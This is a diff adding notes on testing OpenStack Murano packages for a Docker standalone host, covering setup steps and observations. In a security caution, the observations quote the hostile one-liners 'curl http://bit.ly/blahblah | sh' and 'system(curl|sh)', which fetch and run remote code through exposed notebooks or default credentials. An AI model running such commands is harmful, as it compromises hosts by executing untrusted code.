@@ -18,6 +18,8 @@ General Notes
 *************
 
 - If you get an error with importing one of the standard packages, just try a few times until it works.
+- When browsing packages on https://apps.openstack.org/#tab=murano-apps, don't forget to check on the **"Depends On"** section to
+  add any other packages or images required. They in turn may have more dependencies.
 
 """""""""""""
 
@@ -129,6 +131,87 @@ Test Observations:
   own single-package that does both MySQL+Apache and automate Security Groups, Application deployment and even the database
 credentials. 
 
+"""""""""""""
+
+**********************
+Docker StandAlone Host
+**********************
+
+**Packages:**
+
+Packages can be found at https://apps.openstack.org/#tab=murano-apps but here are the links to the ones I used:
+
+1. Docker Interface Library (dependency)
+
+ - http://storage.apps.openstack.org/apps/io.murano.apps.docker.Interfaces.zip
+ - https://github.com/openstack/murano-apps/tree/master/Docker/DockerInterfacesLibrary
+
+2. Docker StandAlone Host
+
+ - http://storage.apps.openstack.org/apps/io.murano.apps.docker.DockerStandaloneHost.zip
+ - https://github.com/openstack/murano-apps/tree/master/Docker/DockerStandaloneHost
+
+**Pre-requisites:**
+
+3. Docker image
+
+ - Download image from - https://apps.openstack.org/#tab=glance-images&asset=Debian%208%20x64%20(pre-installed%20Docker)
+ - Have your OpenStack API credentials ready
+ - Make sure you have the glance CLI
+ - ``glance --os-image-api-version 1 image-create --file debian-8-docker.qcow2 --disk-format qcow2 --container-format bare --name
+   'ubuntu14.04-x64-docker' --property murano_image_info="{\"title\": \"ubuntu14.04-x64-docker\", \"type\": \"linux\"}"``
 
 
+**Setup:**
+
+1. Download package zip files
+
+2. Log on to test cloud 
+
+3. Go to Applications > Manage > Package Definitions
+
+4. Click 'Import Package', upload both packages
+
+5. Go to Applications > Applications Catalog > Environments
+
+6. Click 'Create Environment', name it and leave defaults
+
+7. Drag & Drop 'Docker StandAlone Host' as a component, Floating IP YES
+
+ - Choose any instance flavour
+ - Your key pair
+ - Availability zone: **coreservices** (the only one working at time of writing on test cloud)
+
+8. Post-Murano Actions to complete the exercise
+
+ - SSH onto server
+ - Run ``docker pull ...`` commands as needed
+ - Run ``docker run ...`` commands as needed
+ - Add Security Groups for the instance as needed (e.g. http)
+
+
+Test Observations:
+
+- Quite easy to do. I'm not sure what the Murano package adds other than instantiating the image.
+
+- Quite a few of the other Murano Community Applications apply this practice of loading a pre-built image rather than risking HEAT
+  templates to call shell, ansible/puppet...etc to install software.
+
+- The Good: It is a really good example of wrapping up a perfected image and then giving it a GUI on the horizon dashboard that you
+  can add a few parameters to customise. 
+
+- The Bad: This can give the illusion that you are getting an Application, like Software as a Service or in this case, a PaaS.
+  However, the user actually still has all the responsibilities of the instance such as server patching, maintenance, backup,
+vulnerability risks ...etc of a machine that will be on the internet. 
+
+- In this case, I added a container for ipython notebooks on my Docker host. The following observation is true for a Murano package
+  of a ipython VM instance though: ipython has no concept of users, it would not be hard for a malicious user scanning NeCTAR IP
+addresses to find this service, start a new notebook and run '``!curl http://bit.ly/blahblah | sh``'. 
+
+ - What about apache tomcat with all the default tomcat:tomcat user/pass out there?
+ - Or an R studio with some default user/password for another '``system(curl|sh)``'?
+ - So far, packages on the Murano community catalog seems to require a few post-deployment system admin tasks for the user to
+   perform before it is ready depending on the application.
+ - My point is that there is a level of IT design consideration by the package author and/or user to address. Based on this, I
+   believe the user should still have some degree of system admin skills.
 
